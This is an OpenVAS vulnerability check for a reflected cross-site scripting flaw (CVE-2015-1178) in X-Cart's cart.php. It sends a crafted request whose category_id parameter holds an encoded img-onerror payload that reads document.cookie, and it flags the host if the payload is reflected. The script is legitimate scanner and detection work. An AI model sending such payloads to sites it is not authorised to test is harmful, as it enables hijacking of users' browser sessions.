###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xcart_mult_xss_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# X_CART Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:qualiteam:x-cart";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805600");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2015-1178");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-04-27 10:06:16 +0530 (Mon, 27 Apr 2015)");
  script_name("X_CART Multiple Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_xcart_detect.nasl");
  script_mandatory_keys("X_CART/Installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://octogence.com/advisories/cve-2015-1178-xss-x-cart/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/534529/100/0/threaded");

  script_tag(name:"summary", value:"This host is installed with XCART
  and is prone to multiple cross site scripting vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");
  script_tag(name:"insight", value:"The flaws are due to the cart.php script
  does not validate input to the 'product_id' and 'category_id' GET parameters
  before returning it to users.");
  script_tag(name:"impact", value:"Successful exploitation will allow a
  context-dependent attacker to create a specially crafted request that would
  execute arbitrary script code in a user's browser session within the trust
  relationship between their browser and the server.");
  script_tag(name:"affected", value:"XCART versions 5.1.8 and earlier.");
  script_tag(name:"solution", value:"Upgrade to 5.2.6.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.x-cart.com");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/cart.php?target=product&product_id=&category_id=1%E2%80%93--"
          + "%3E%3Cimg%20src=a%20onerror=alert%28document.cookie%29%3E";

host = http_host_name( port:port );
useragent = http_get_user_agent();
sndReq = string("GET ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n");
rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

if( rcvRes =~ "HTTP/1\.. 200" && "alert(document.cookie)" >< rcvRes && "X-Cart" >< rcvRes ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
